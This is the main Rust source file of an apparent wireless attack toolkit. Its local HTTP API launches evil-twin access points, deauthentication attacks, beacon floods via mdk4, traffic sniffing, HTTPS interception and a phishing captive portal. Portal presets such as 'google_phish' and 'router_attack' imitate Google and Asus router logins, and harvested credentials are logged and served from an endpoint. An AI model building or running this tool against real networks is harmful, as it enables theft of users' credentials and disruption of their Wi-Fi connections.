#![allow(dead_code)]

use serde::{Deserialize, Serialize};
use std::env;
use std::fs;
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::path::{Path, PathBuf};


mod ap_manager;
mod proxy;
mod system_control;
mod traffic_engine;
mod utils;
mod interfaces;
mod orchestrator;
mod event_bus;
mod hostapd;
mod dhcp;
mod dns;
mod captive_portal;
mod deauth;
mod beacon_flood;
mod http_proxy;
mod mitm;
mod recon;
mod plugin_system;
mod packet_capture;
mod webui;
mod state_machine;
mod networking;
mod improvements;
mod https_detection;
mod logging;
mod config;

use crate::config::{AppConfig, Profile};
use std::sync::{Mutex, OnceLock};

static APP_CONFIG: OnceLock<Mutex<AppConfig>> = OnceLock::new();

fn get_app_config() -> &'static Mutex<AppConfig> {
    APP_CONFIG.get().expect("AppConfig not initialized")
}

#[derive(Clone, Debug, Deserialize, Serialize)]
struct PluginManifest {
    name: String,
    #[serde(rename = "type")]
    plugin_type: String,
    enabled: bool,
    description: String,
}

#[derive(Debug, Serialize)]
struct StatusResponse {
    service: String,
    version: String,
    config: AppConfig,
    plugins: Vec<PluginManifest>,
}

#[derive(Clone, Debug, Deserialize)]
struct PluginConfig {
    plugins: Vec<PluginManifest>,
}

fn find_existing_file(candidates: &[PathBuf]) -> Option<PathBuf> {
    for path in candidates {
        if path.exists() && path.is_file() {
            return Some(path.clone());
        }
    }
    None
}

fn candidate_config_paths() -> Vec<PathBuf> {
    let mut candidates = Vec::new();
    if let Ok(cwd) = env::current_dir() {
        candidates.push(cwd.join("config/global.yaml"));
        candidates.push(cwd.join("../config/global.yaml"));
    }
    if let Ok(exe) = env::current_exe() {
        let exe_dir = exe.parent().unwrap_or_else(|| Path::new(".")).to_path_buf();
        candidates.push(exe_dir.join("config/global.yaml"));
        candidates.push(exe_dir.join("../config/global.yaml"));
        candidates.push(exe_dir.join("../../config/global.yaml"));
    }
    candidates
}

fn candidate_plugin_paths() -> Vec<PathBuf> {
    let mut candidates = Vec::new();
    if let Ok(cwd) = env::current_dir() {
        candidates.push(cwd.join("config/plugins.yaml"));
        candidates.push(cwd.join("../config/plugins.yaml"));
    }
    if let Ok(exe) = env::current_exe() {
        let exe_dir = exe.parent().unwrap_or_else(|| Path::new(".")).to_path_buf();
        candidates.push(exe_dir.join("config/plugins.yaml"));
        candidates.push(exe_dir.join("../config/plugins.yaml"));
        candidates.push(exe_dir.join("../../config/plugins.yaml"));
    }
    candidates
}

fn resolve_config_path() -> Result<PathBuf, String> {
    if let Ok(env_path) = env::var("AP1_CONFIG_PATH") {
        let path = PathBuf::from(env_path);
        if path.exists() {
            return Ok(path);
        }
        return Err(format!("AP1_CONFIG_PATH points to missing file: {}", path.display()));
    }
    find_existing_file(&candidate_config_paths()).ok_or_else(|| {
        "Could not locate config/global.yaml. Set AP1_CONFIG_PATH or run from project root.".into()
    })
}

fn resolve_plugin_path() -> Result<PathBuf, String> {
    if let Ok(env_path) = env::var("AP1_PLUGIN_CONFIG_PATH") {
        let path = PathBuf::from(env_path);
        if path.exists() {
            return Ok(path);
        }
        return Err(format!("AP1_PLUGIN_CONFIG_PATH points to missing file: {}", path.display()));
    }
    find_existing_file(&candidate_plugin_paths()).ok_or_else(|| {
        "Could not locate config/plugins.yaml. Set AP1_PLUGIN_CONFIG_PATH or run from project root.".into()
    })
}

fn load_config(path: &Path) -> Result<AppConfig, String> {
    let raw = fs::read_to_string(path).map_err(|err| format!("failed to read config {}: {}", path.display(), err))?;
    serde_yaml::from_str(&raw).map_err(|err| format!("failed to parse config {}: {}", path.display(), err))
}

fn load_plugin_config(path: &Path) -> Result<Vec<PluginManifest>, String> {
    let raw = fs::read_to_string(path).map_err(|err| format!("failed to read plugin config {}: {}", path.display(), err))?;
    let config: PluginConfig = serde_yaml::from_str(&raw).map_err(|err| format!("failed to parse plugin config {}: {}", path.display(), err))?;
    Ok(config.plugins)
}

fn write_response(stream: &mut TcpStream, status: &str, body: &str, content_type: &str) {
    let response = format!(
        "HTTP/1.1 {}\r\nContent-Type: {}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
        status,
        content_type,
        body.as_bytes().len(),
        body
    );
    let _ = stream.write_all(response.as_bytes());
}

fn write_json_response(stream: &mut TcpStream, status: &str, body: &str) {
    write_response(stream, status, body, "application/json")
}

fn parse_request_line(request: &str) -> (&str, &str) {
    let line = request.lines().next().unwrap_or_default();
    let mut parts = line.split_whitespace();
    let method = parts.next().unwrap_or_default();
    let path = parts.next().unwrap_or("/");
    (method, path)
}

fn request_body(request: &str) -> &str {
    request.split("\r\n\r\n").nth(1).unwrap_or("")
}

fn save_config(path: &Path, cfg: &AppConfig) -> Result<(), String> {
    let raw = serde_yaml::to_string(cfg).map_err(|e| format!("failed to serialize config: {}", e))?;
    fs::write(path, raw).map_err(|e| format!("failed to write config: {}", e))
}

fn portal_interface(config: &AppConfig) -> String {
    if config.network.default_interface.is_empty() {
        "wlan0".to_string()
    } else {
        config.network.default_interface.clone()
    }
}

fn portal_ip(config: &AppConfig) -> String {
    if config.network.portal_ip.is_empty() {
        "192.168.50.1".to_string()
    } else {
        config.network.portal_ip.clone()
    }
}

fn portal_config_from_app(config: &AppConfig) -> captive_portal::PortalConfig {
    captive_portal::PortalConfig {
        template_dir: if config.network.template.is_empty() {
            "../config/templates/DarkLogin".to_string()
        } else {
            format!("../config/templates/{}", config.network.template)
        },
        log_path: "../system/runtime/portal_credentials.log".to_string(),
        portal_ip: portal_ip(config),
        portal_port: config.network.portal_port.unwrap_or(80),
        fallback_port: config.network.portal_fallback_port.unwrap_or(8000),
    }
}

#[derive(Deserialize)]
struct ProfileSelectRequest {
    profile: String,
}

#[derive(Deserialize)]
struct FirewallRequest {
    interface: Option<String>,
    portal_ip: Option<String>,
}

#[derive(Deserialize)]
struct InterfaceRequest {
    interface: Option<String>,
    ip: Option<String>,
    subnet: Option<String>,
}

#[derive(Deserialize)]
struct DeauthRequest {
    interface: String,
    bssid: String,
    client: Option<String>,
    count: Option<u32>,
}

#[derive(Deserialize)]
struct EvilTwinRequest {
    interface: String,
    ssid: String,
}

#[derive(Deserialize)]
struct BeaconRequest {
    interface: String,
    ssids: Vec<String>,
}

fn handle_request(stream: &mut TcpStream, config_path: &PathBuf, plugin_config_path: &PathBuf) {
    let mut buffer = [0; 4096];
    let size = match stream.read(&mut buffer) {
        Ok(size) if size > 0 => size,
        _ => return,
    };

    let request = String::from_utf8_lossy(&buffer[..size]);
    let (method, request_path) = parse_request_line(&request);
    let request_path = request_path.split('?').next().unwrap_or(request_path);

    match request_path {
        "/" => {
            if method == "GET" {
                write_response(stream, "200 OK", "AP1 core engine alive", "text/plain");
            } else {
                write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
            }
        }
        "/health" => {
            if method == "GET" {
                write_json_response(stream, "200 OK", "{\"status\":\"ok\"}");
            } else {
                write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
            }
        }
        "/status" => {
            if method != "GET" {
                write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
                return;
            }

            let mut config = get_app_config().lock().unwrap().clone();

            // Override with current runtime environment variable for backward compatibility
            if let Ok(iface) = std::env::var("AP1_IFACE") {
                config.network.default_interface = iface;
            }

            let plugins = match load_plugin_config(plugin_config_path) {
                Ok(list) => list,
                Err(_) => Vec::new(),
            };
            let response = StatusResponse {
                service: "ap1_core".to_string(),
                version: env!("CARGO_PKG_VERSION").to_string(),
                config,
                plugins,
            };
            let body = serde_json::to_string(&response).unwrap_or_else(|_| "{}".to_string());
            write_json_response(stream, "200 OK", &body);
        }
        "/config" => {
            if method != "GET" {
                write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
                return;
            }
            let config = get_app_config().lock().unwrap().clone();
            let body = serde_json::to_string(&config).unwrap_or_else(|_| "{}".to_string());
            write_json_response(stream, "200 OK", &body);
        }
        "/plugins" => {
            if method != "GET" {
                write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
                return;
            }
            let plugins = match load_plugin_config(plugin_config_path) {
                Ok(list) => list,
                Err(err) => {
                    write_response(stream, "500 Internal Server Error", &format!("{{\"error\":\"{}\"}}", err), "application/json");
                    return;
                }
            };
            let body = serde_json::to_string(&plugins).unwrap_or_else(|_| "[]".to_string());
            write_json_response(stream, "200 OK", &body);
        }
        "/api/system/firewall/apply" => {
            if method != "POST" {
                write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
                return;
            }
            let body = request_body(&request);
            let payload: FirewallRequest = match serde_json::from_str(body) {
                Ok(payload) => payload,
                Err(err) => {
                    write_response(stream, "400 Bad Request", &format!("{{\"error\":\"invalid payload: {}\"}}", err), "application/json");
                    return;
                }
            };
            let iface = payload.interface.unwrap_or_else(|| "wlan0".to_string());
            let portal = payload.portal_ip.unwrap_or_else(|| "192.168.50.1".to_string());
            if let Err(err) = system_control::apply_firewall_rules(&iface, &portal) {
                write_response(stream, "500 Internal Server Error", &format!("{{\"error\":\"{}\"}}", err), "application/json");
                return;
            }
            write_json_response(stream, "200 OK", "{\"status\":\"firewall rules applied\"}");
        }
        "/api/system/firewall/clear" => {
            if method != "POST" {
                write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
                return;
            }
            let body = request_body(&request);
            let payload: FirewallRequest = match serde_json::from_str(body) {
                Ok(payload) => payload,
                Err(err) => {
                    write_response(stream, "400 Bad Request", &format!("{{\"error\":\"invalid payload: {}\"}}", err), "application/json");
                    return;
                }
            };
            let iface = payload.interface.unwrap_or_else(|| "wlan0".to_string());
            let portal = payload.portal_ip.unwrap_or_else(|| "192.168.50.1".to_string());
            if let Err(err) = system_control::clear_firewall_rules(&iface, &portal) {
                write_response(stream, "500 Internal Server Error", &format!("{{\"error\":\"{}\"}}", err), "application/json");
                return;
            }
            write_json_response(stream, "200 OK", "{\"status\":\"firewall rules cleared\"}");
        }
        "/api/system/interface/configure" => {
            if method != "POST" {
                write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
                return;
            }
            let body = request_body(&request);
            let payload: InterfaceRequest = match serde_json::from_str(body) {
                Ok(payload) => payload,
                Err(err) => {
                    write_response(stream, "400 Bad Request", &format!("{{\"error\":\"invalid payload: {}\"}}", err), "application/json");
                    return;
                }
            };
            let iface = payload.interface.unwrap_or_else(|| "wlan0".to_string());
            let ip = payload.ip.unwrap_or_else(|| "192.168.50.1".to_string());
            let subnet = payload.subnet.unwrap_or_else(|| "24".to_string());
            if let Err(err) = system_control::configure_interface(&iface, &ip, &subnet) {
                write_response(stream, "500 Internal Server Error", &format!("{{\"error\":\"{}\"}}", err), "application/json");
                return;
            }
            write_json_response(stream, "200 OK", &format!("{{\"status\":\"interface {} configured\"}}", iface));
        }
        "/api/portal/start" => {
            if method != "POST" {
                write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
                return;
            }
            let config = get_app_config().lock().unwrap().clone();
            let portal_cfg = portal_config_from_app(&config);
            captive_portal::start_portal_with_config(portal_cfg.clone());
            traffic_engine::start_traffic_engine(&portal_interface(&config), &portal_cfg.portal_ip);
            write_json_response(stream, "200 OK", "{\"status\":\"portal started\"}");
        }
        "/api/portal/stop" => {
            if method != "POST" {
                write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
                return;
            }
            let config = get_app_config().lock().unwrap().clone();
            let iface = portal_interface(&config);
            let portal_cfg = portal_config_from_app(&config);
            if let Err(err) = orchestrator::stop_ap_session(&iface, &portal_cfg) {
                write_response(stream, "500 Internal Server Error", &format!("{{\"error\":\"{}\"}}", err), "application/json");
                return;
            }
            write_json_response(stream, "200 OK", "{\"status\":\"AP session stopped\"}");
        }
        "/api/portal/status" => {
            if method != "GET" {
                write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
                return;
            }
            let is_running = captive_portal::is_running();
            let credentials = captive_portal::read_credentials();

            // Convert simple strings to JSON objects for the CLI
            let mut cred_objs = Vec::new();
            for line in credentials {
                let mut obj = serde_json::Map::new();
                for part in line.split_whitespace() {
                    let kv: Vec<&str> = part.splitn(2, '=').collect();
                    if kv.len() == 2 {
                        obj.insert(kv[0].to_string(), serde_json::Value::String(kv[1].to_string()));
                    }
                }
                cred_objs.push(serde_json::Value::Object(obj));
            }

            let response = serde_json::json!({
                "running": is_running,
                "credentials": cred_objs
            });
            let body = response.to_string();
            write_json_response(stream, "200 OK", &body);
        }
        "/api/portal/credentials" => {
            if method != "GET" {
                write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
                return;
            }
            let credentials = captive_portal::read_credentials();
            let mut cred_objs = Vec::new();
            for line in credentials {
                let mut obj = serde_json::Map::new();
                for part in line.split_whitespace() {
                    let kv: Vec<&str> = part.splitn(2, '=').collect();
                    if kv.len() == 2 {
                        obj.insert(kv[0].to_string(), serde_json::Value::String(kv[1].to_string()));
                    }
                }
                cred_objs.push(serde_json::Value::Object(obj));
            }
            let body = serde_json::Value::Array(cred_objs).to_string();
            write_json_response(stream, "200 OK", &body);
        }
        "/api/config/set_interface" => {
            if method != "POST" {
                write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
                return;
            }
            let body = request_body(&request);
            let payload: InterfaceRequest = match serde_json::from_str(body) {
                Ok(payload) => payload,
                Err(err) => {
                    write_response(stream, "400 Bad Request", &format!("{{\"error\":\"invalid payload: {}\"}}", err), "application/json");
                    return;
                }
            };
            if let Some(iface) = payload.interface {
                std::env::set_var("AP1_IFACE", &iface);
                let mut config = get_app_config().lock().unwrap();
                config.network.default_interface = iface.clone();
                let _ = save_config(config_path, &config);
                write_json_response(stream, "200 OK", &format!("{{\"status\":\"interface set to {}\"}}", iface));
            } else {
                write_response(stream, "400 Bad Request", "{\"error\":\"interface is required\"}", "application/json");
            }
        }
        "/api/config/update" => {
            if method != "POST" {
                write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
                return;
            }
            let body = request_body(&request);
            let json_body: serde_json::Value = match serde_json::from_str(body) {
                Ok(v) => v,
                Err(_) => {
                    write_response(stream, "400 Bad Request", "{\"error\":\"invalid json\"}", "application/json");
                    return;
                }
            };

            let mut config = get_app_config().lock().unwrap();
            let active_profile_name = config.active_profile.clone().unwrap_or_else(|| "default".to_string());

            if let Some(val) = json_body.get("ssid") {
                if let Some(ssid) = val.as_str() {
                    if let Some(profiles) = config.profiles.as_mut() {
                        if let Some(p) = profiles.iter_mut().find(|p| p.name == active_profile_name) {
                            p.ssid = ssid.to_string();
                        }
                    }
                }
            }
            if let Some(val) = json_body.get("channel") {
                if let Some(ch) = val.as_i64() {
                    if let Some(profiles) = config.profiles.as_mut() {
                        if let Some(p) = profiles.iter_mut().find(|p| p.name == active_profile_name) {
                            p.channel = ch as i32;
                        }
                    }
                }
            }
            if let Some(val) = json_body.get("password") {
                if let Some(pass) = val.as_str() {
                    if let Some(profiles) = config.profiles.as_mut() {
                        if let Some(p) = profiles.iter_mut().find(|p| p.name == active_profile_name) {
                            p.password = pass.to_string();
                        }
                    }
                }
            }
            if let Some(val) = json_body.get("security") {
                if let Some(sec) = val.as_str() {
                    if let Some(profiles) = config.profiles.as_mut() {
                        if let Some(p) = profiles.iter_mut().find(|p| p.name == active_profile_name) {
                            p.security = Some(sec.to_string());
                        }
                    }
                }
            }

            let _ = save_config(config_path, &config);
            write_json_response(stream, "200 OK", "{\"status\":\"config updated\"}");
        }
        "/api/config/preset" => {
            if method != "POST" {
                write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
                return;
            }
            let body = request_body(&request);
            let json_body: serde_json::Value = match serde_json::from_str(body) {
                Ok(v) => v,
                Err(_) => {
                    write_response(stream, "400 Bad Request", "{\"error\":\"invalid json\"}", "application/json");
                    return;
                }
            };

            let mut config = get_app_config().lock().unwrap();
            let active_profile_name = config.active_profile.clone().unwrap_or_else(|| "default".to_string());

            if let Some(name) = json_body.get("name").and_then(|v| v.as_str()) {
                match name {
                    "open_nav" => {
                        config.network.captive_portal = false;
                        if let Some(profiles) = config.profiles.as_mut() {
                            if let Some(p) = profiles.iter_mut().find(|p| p.name == active_profile_name) {
                                p.ssid = "Free_Internet".to_string();
                                p.security = Some("open".to_string());
                            }
                        }
                    },
                    "google_phish" => {
                        config.network.captive_portal = true;
                        config.network.template = "Google".to_string();
                        if let Some(profiles) = config.profiles.as_mut() {
                            if let Some(p) = profiles.iter_mut().find(|p| p.name == active_profile_name) {
                                p.ssid = "Google_Free_Wifi".to_string();
                                p.security = Some("open".to_string());
                            }
                        }
                    },
                    "router_attack" => {
                        config.network.captive_portal = true;
                        config.network.template = "RouterLogin".to_string();
                        if let Some(profiles) = config.profiles.as_mut() {
                            if let Some(p) = profiles.iter_mut().find(|p| p.name == active_profile_name) {
                                p.ssid = "Asus_Router_Update".to_string();
                                p.security = Some("open".to_string());
                            }
                        }
                    },
                    _ => {
                        write_response(stream, "400 Bad Request", "{\"error\":\"unknown preset\"}", "application/json");
                        return;
                    }
                }
                let _ = save_config(config_path, &config);
                write_json_response(stream, "200 OK", &format!("{{\"status\":\"preset {} applied\"}}", name));
            } else {
                write_response(stream, "400 Bad Request", "{\"error\":\"name is required\"}", "application/json");
            }
        }
        "/api/recon/networks" => {
            if method != "GET" {
                write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
                return;
            }
            // Logic for scanning handled in Go for interfaces,
            // but we add congestion endpoint here
            write_json_response(stream, "200 OK", "{\"status\":\"ok\"}");
        }
        "/api/recon/congestion" => {
            if method != "GET" {
                write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
                return;
            }
            recon::analyze_congestion("wlan0");
            write_json_response(stream, "200 OK", "{\"status\":\"analysis printed to core log\"}");
        }
        "/api/deauth/start" => {
            if method != "POST" {
                write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
                return;
            }
            let body = request_body(&request);
            let payload: DeauthRequest = match serde_json::from_str(body) {
                Ok(payload) => payload,
                Err(err) => {
                    write_response(stream, "400 Bad Request", &format!("{{\"error\":\"invalid payload: {}\"}}", err), "application/json");
                    return;
                }
            };
            let count = payload.count.unwrap_or(10);
            let result = if let Some(client) = payload.client {
                deauth::deauth_client(&payload.interface, &payload.bssid, &client, count)
            } else {
                deauth::deauth_all(&payload.interface, &payload.bssid)
            };
            match result {
                Ok(out) => write_json_response(stream, "200 OK", &format!("{{\"status\":\"deauth started\", \"output\":\"{}\"}}", out.replace("\"", "\\\""))),
                Err(err) => write_response(stream, "500 Internal Server Error", &format!("{{\"error\":\"{}\"}}", err), "application/json"),
            }
        }
        "/api/eviltwin/start" => {
            if method != "POST" {
                write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
                return;
            }
            let body = request_body(&request);
            let payload: EvilTwinRequest = match serde_json::from_str(body) {
                Ok(payload) => payload,
                Err(err) => {
                    write_response(stream, "400 Bad Request", &format!("{{\"error\":\"invalid payload: {}\"}}", err), "application/json");
                    return;
                }
            };
            let config = get_app_config().lock().unwrap().clone();
            let portal_cfg = portal_config_from_app(&config);
            if let Err(err) = orchestrator::start_evil_twin(&payload.interface, &payload.ssid, &portal_cfg) {
                write_response(stream, "500 Internal Server Error", &format!("{{\"error\":\"{}\"}}", err), "application/json");
                return;
            }
            write_json_response(stream, "200 OK", &format!("{{\"status\":\"evil twin for {} started\"}}", payload.ssid));
        }
        "/api/beacon/start" => {
            if method != "POST" {
                write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
                return;
            }
            let body = request_body(&request);
            let payload: BeaconRequest = match serde_json::from_str(body) {
                Ok(payload) => payload,
                Err(err) => {
                    write_response(stream, "400 Bad Request", &format!("{{\"error\":\"invalid payload: {}\"}}", err), "application/json");
                    return;
                }
            };
            // Start flooding
            let flood = beacon_flood::BeaconFlood::new();
            flood.start(&payload.interface, payload.ssids);
            write_json_response(stream, "200 OK", "{\"status\":\"beacon flood started\"}");
        }
        "/api/beacon/stop" => {
             // Logic to stop flood (simplified for now)
             let _ = std::process::Command::new("pkill").arg("-f").arg("mdk4").output();
             write_json_response(stream, "200 OK", "{\"status\":\"beacon flood stopped\"}");
        }
        "/api/profiles/select" => {
            if method != "POST" {
                write_response(stream, "405 Method Not Allowed", "Method not allowed", "text/plain");
                return;
            }
            let body = request_body(&request);
            let payload: ProfileSelectRequest = match serde_json::from_str(body) {
                Ok(payload) => payload,
                Err(err) => {
                    write_response(stream, "400 Bad Request", &format!("{{\"error\":\"invalid payload: {}\"}}", err), "application/json");
                    return;
                }
            };
            if payload.profile.is_empty() {
                write_response(stream, "400 Bad Request", "{\"error\":\"profile is required\"}", "application/json");
                return;
            }
            let mut config = get_app_config().lock().unwrap().clone();
            let profiles = match &config.profiles {
                Some(list) => list,
                None => {
                    write_response(stream, "404 Not Found", "{\"error\":\"no profiles configured\"}", "application/json");
                    return;
                }
            };
            let selected = profiles.iter().find(|p| p.name == payload.profile).cloned();
            if selected.is_none() {
                write_response(stream, "404 Not Found", "{\"error\":\"profile not found\"}", "application/json");
                return;
            }
            config.active_profile = Some(payload.profile.clone());
            {
                let mut global_cfg = get_app_config().lock().unwrap();
                *global_cfg = config.clone();
            }
            if let Err(err) = save_config(config_path, &config) {
                write_response(stream, "500 Internal Server Error", &format!("{{\"error\":\"{}\"}}", err), "application/json");
                return;
            }
            let iface = if let Ok(env_iface) = std::env::var("AP1_IFACE") {
                env_iface
            } else if config.network.default_interface.is_empty() {
                "wlan0".to_string()
            } else {
                config.network.default_interface.clone()
            };
            let portal_cfg = portal_config_from_app(&config);
            if let Err(err) = orchestrator::start_ap_session(&iface, &selected.unwrap(), &portal_cfg, config.network.captive_portal) {
                write_response(stream, "500 Internal Server Error", &format!("{{\"error\":\"{}\"}}", err), "application/json");
                return;
            }
            write_json_response(stream, "200 OK", &format!("{{\"status\":\"profile {} activated\"}}", payload.profile));
        }
        _ => write_response(stream, "404 Not Found", "Not found", "text/plain"),
    }
}

fn extract_listen_addr(config: &AppConfig) -> String {
    if let Ok(addr) = env::var("AP1_CORE_ADDR") {
        if !addr.is_empty() {
            return addr;
        }
    }

    if !config.app.core_url.is_empty() {
        let url = config.app.core_url.trim();
        if let Some(stripped) = url.strip_prefix("http://") {
            return stripped.to_string();
        }
        if let Some(stripped) = url.strip_prefix("https://") {
            return stripped.to_string();
        }
    }

    "127.0.0.1:8081".to_string()
}

fn main() -> std::io::Result<()> {
    let config_path = resolve_config_path().unwrap_or_else(|err| {
        panic!("Unable to resolve config path: {}", err);
    });
    let plugin_config_path = resolve_plugin_path().unwrap_or_else(|err| {
        panic!("Unable to resolve plugin config path: {}", err);
    });
    let config = load_config(&config_path).unwrap_or_else(|err| {
        panic!("Unable to load config: {}", err);
    });
    APP_CONFIG.set(Mutex::new(config.clone())).expect("Failed to set initial AppConfig");

    let listen_addr = extract_listen_addr(&config);
    let listener = TcpListener::bind(&listen_addr)?;
    println!("{}", utils::format_status(&format!("Starting AP1 core engine on http://{}", listen_addr)));

    logging::init_logging();
    event_bus::subscribe("core.events");
    event_bus::emit(&"core started".to_string());
    webui::start_webui();

    let portal_ip = if config.network.portal_ip.is_empty() {
        "192.168.50.1".to_string()
    } else {
        config.network.portal_ip.clone()
    };
    let _dns_ip = if config.network.dns_ip.is_empty() {
        portal_ip.clone()
    } else {
        config.network.dns_ip.clone()
    };
    let _subnet = config.network.subnet.unwrap_or(24);

    let network_iface = if let Ok(env_iface) = std::env::var("AP1_IFACE") {
        if !env_iface.is_empty() { env_iface } else { "wlan0".to_string() }
    } else if !config.network.default_interface.is_empty() {
        config.network.default_interface.clone()
    } else {
        "wlan0".to_string()
    };
    let network_iface = &network_iface;
    println!("[*] Core using interface: {}", network_iface);

    if config.network.captive_portal {
        // Handled by orchestrator::start_ap_session
    }

    if let Err(err) = packet_capture::start(network_iface, "../system/runtime/packet_capture.log") {
        eprintln!("packet capture start failed: {}", err);
    }
    mitm::sniff_traffic(network_iface);

    let profile = if let Some(active) = config.active_profile.as_ref() {
        config.profiles.as_ref().and_then(|profiles| {
            profiles.iter().find(|p| &p.name == active).cloned()
        }).unwrap_or_else(|| Profile {
            name: "default".to_string(),
            ssid: "AP1-Test".to_string(),
            password: "password123".to_string(),
            channel: 1,
            mode: "g".to_string(),
            dhcp_enabled: true,
            security: Some("wpa2".to_string()),
        })
    } else {
        config.profiles.as_ref().and_then(|profiles| profiles.first().cloned()).unwrap_or(Profile {
            name: "default".to_string(),
            ssid: "AP1-Test".to_string(),
            password: "password123".to_string(),
            channel: 1,
            mode: "g".to_string(),
            dhcp_enabled: true,
            security: Some("wpa2".to_string()),
        })
    };

    if let Err(err) = plugin_system::load_plugins(&plugin_config_path) {
        eprintln!("plugin loader warning: {}", err);
    }
    plugin_system::trigger_hook("pre_ap_start", &plugin_config_path);

    let portal_cfg = portal_config_from_app(&config);
    if let Err(e) = orchestrator::start_ap_session(network_iface, &profile, &portal_cfg, config.network.captive_portal) {
        eprintln!("Failed to start AP session: {}", e);
    }
    http_proxy::start_proxy(8080);
    https_detection::start_https_interceptor(8443);
    proxy::init_proxy();
    orchestrator::start_module("core");

    for stream in listener.incoming() {
        if let Ok(mut stream) = stream {
            handle_request(&mut stream, &config_path, &plugin_config_path);
        }
    }
    Ok(())
}
